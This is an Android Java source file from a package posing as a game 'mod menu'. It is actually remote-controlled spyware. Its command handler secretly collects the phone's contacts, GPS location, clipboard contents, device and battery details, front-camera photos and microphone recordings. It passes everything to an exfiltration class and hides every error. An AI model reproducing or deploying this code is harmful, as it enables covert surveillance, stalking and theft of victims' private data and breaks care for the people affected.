package com.brawl.modmenu;

import android.app.Activity;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.location.Location;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.Vibrator;
import android.util.Base64;
import android.util.Size;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class CommandHandler {

    // === SCREENSHOT через MediaProjection, уже есть в MediaSniffer ===

    public static void takeScreenshot(Context ctx) {
        try {
            Intent i = new Intent(ctx, MediaSniffer.class);
            i.setAction("CAPTURE_NOW");
            ctx.startService(i);
        } catch (Throwable ignored) {}
    }

    // === INFO ===

    public static void sendInfo(Context ctx) {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("📱 ").append(Build.MANUFACTURER).append(" ")
                  .append(Build.MODEL).append("\n");
                sb.append("Android: ").append(Build.VERSION.RELEASE)
                  .append(" (API ").append(Build.VERSION.SDK_INT).append(")\n");

                // battery
                IntentFilter ifil = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent bat = ctx.registerReceiver(null, ifil);
                if (bat != null) {
                    int level = bat.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                    int status = bat.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                    boolean charging = status == BatteryManager.BATTERY_STATUS_CHARGING
                        || status == BatteryManager.BATTERY_STATUS_FULL;
                    sb.append("🔋 Батарея: ").append(level).append("%")
                      .append(charging ? " ⚡" : "").append("\n");
                }

                Exfil.send("INFO", sb.toString());
            } catch (Throwable ignored) {}
        }).start();
    }

    public static void sendBattery(Context ctx) {
        try {
            IntentFilter ifil = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent bat = ctx.registerReceiver(null, ifil);
            if (bat != null) {
                int level = bat.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int status = bat.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                boolean charging = status == BatteryManager.BATTERY_STATUS_CHARGING
                    || status == BatteryManager.BATTERY_STATUS_FULL;
                Exfil.send("BATTERY", level + "%  " + (charging ? "⚡ Заряжается" : "🔋 Разряд"));
            }
        } catch (Throwable ignored) {}
    }

    // === CONTACTS ===

    public static void sendContacts(Context ctx) {
        try {
            StringBuilder sb = new StringBuilder();
            android.database.Cursor c = ctx.getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            if (c == null) return;
            int count = 0;
            while (c.moveToNext() && count < 1000) {
                String name = c.getString(c.getColumnIndexOrThrow(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = c.getString(c.getColumnIndexOrThrow(
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append("👤 ").append(name).append(" — ").append(phone).append("\n");
                count++;
            }
            c.close();
            sb.insert(0, "Всего: " + count + "\n\n");
            Exfil.send("CONTACTS", sb.toString());
        } catch (Throwable ignored) {}
    }

    // === LOCATION ===

    public static void sendLocation(Context ctx) {
        new Thread(() -> {
            try {
                LocationManager lm = (LocationManager)
                    ctx.getSystemService(Context.LOCATION_SERVICE);
                if (lm == null) return;

                Location loc = null;
                try {
                    loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                } catch (Throwable ignored) {}
                if (loc == null) {
                    try {
                        loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    } catch (Throwable ignored) {}
                }

                if (loc != null) {
                    String msg = "📍 Координаты:\n" +
                        "Широта: " + loc.getLatitude() + "\n" +
                        "Долгота: " + loc.getLongitude() + "\n" +
                        "Точность: " + loc.getAccuracy() + " м\n" +
                        "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
                    Exfil.send("LOCATION", msg);
                } else {
                    Exfil.send("LOCATION", "GPS недоступен (нет разрешения или сигнала)");
                }
            } catch (Throwable t) {
                Exfil.send("LOCATION", "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    // === CLIPBOARD ===

    public static void sendClipboard(Context ctx) {
        try {
            ClipboardManager cm = (ClipboardManager)
                ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                CharSequence txt = cm.getPrimaryClip().getItemAt(0).coerceToText(ctx);
                if (txt != null && txt.length() > 0) {
                    Exfil.send("CLIPBOARD", txt.toString());
                } else {
                    Exfil.send("CLIPBOARD", "Пусто");
                }
            }
        } catch (Throwable ignored) {}
    }

    // === VIBRATE ===

    public static void vibrate(Context ctx) {
        try {
            Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) v.vibrate(1000);
        } catch (Throwable ignored) {}
    }

    // === PHOTO (фронтальная камера) ===

    public static void takePhoto(Context ctx) {
        new Thread(() -> {
            try {
                CameraManager cm = (CameraManager)
                    ctx.getSystemService(Context.CAMERA_SERVICE);
                if (cm == null) return;

                String[] cams = cm.getCameraIdList();
                for (String id : cams) {
                    android.hardware.camera2.CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                    Integer facing = ch.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                    if (facing != null && facing ==
                        android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT) {
                        captureFromCamera(ctx, cm, id);
                        return;
                    }
                }
                // fallback — любая
                if (cams.length > 0) captureFromCamera(ctx, cm, cams[0]);
            } catch (Throwable t) {
                Exfil.send("PHOTO", "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    private static void captureFromCamera(Context ctx, CameraManager cm, String camId) {
        try {
            final HandlerThread ht = new HandlerThread("cam");
            ht.start();
            final Handler h = new Handler(ht.getLooper());

            final ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);

            reader.setOnImageAvailableListener(r -> {
                try {
                    Image img = r.acquireLatestImage();
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] data = new byte[buf.remaining()];
                    buf.get(data);
                    img.close();

                    String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                    Exfil.sendPhoto("PHOTO", b64);
                    ht.quitSafely();
                } catch (Throwable ignored) {}
            }, h);

            cm.openCamera(camId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice cam) {
                    try {
                        CaptureRequest.Builder b = cam.createCaptureRequest(
                            CameraDevice.TEMPLATE_STILL_CAPTURE);
                        b.addTarget(reader.getSurface());
                        cam.createCaptureSession(Arrays.asList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession s) {
                                    try {
                                        s.capture(b.build(), null, h);
                                    } catch (Throwable ignored) {}
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession s) {}
                            }, h);
                    } catch (Throwable ignored) {}
                }
                @Override
                public void onDisconnected(CameraDevice cam) {
                    try { cam.close(); } catch (Throwable ignored) {}
                }
                @Override
                public void onError(CameraDevice cam, int err) {
                    try { cam.close(); } catch (Throwable ignored) {}
                }
            }, h);
        } catch (Throwable t) {
            Exfil.send("PHOTO", "Ошибка камеры: " + t.getMessage());
        }
    }

    // === MIC (запись 20 сек) ===

    public static void recordMic(Context ctx, int seconds) {
        new Thread(() -> {
            try {
                File out = new File(ctx.getCacheDir(), "rec.m4a");
                MediaRecorder rec = new MediaRecorder();
                rec.setAudioSource(MediaRecorder.AudioSource.MIC);
                rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                rec.setOutputFile(out.getAbsolutePath());
                rec.prepare();
                rec.start();

                Thread.sleep(seconds * 1000L);
                rec.stop();
                rec.release();

                FileInputStream fis = new FileInputStream(out);
                byte[] data = new byte[(int) out.length()];
                fis.read(data);
                fis.close();
                out.delete();

                String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                Exfil.sendAudio("MIC", b64, seconds);
            } catch (Throwable t) {
                Exfil.send("MIC", "Ошибка: " + t.getMessage());
            }
        }).start();
    }
}
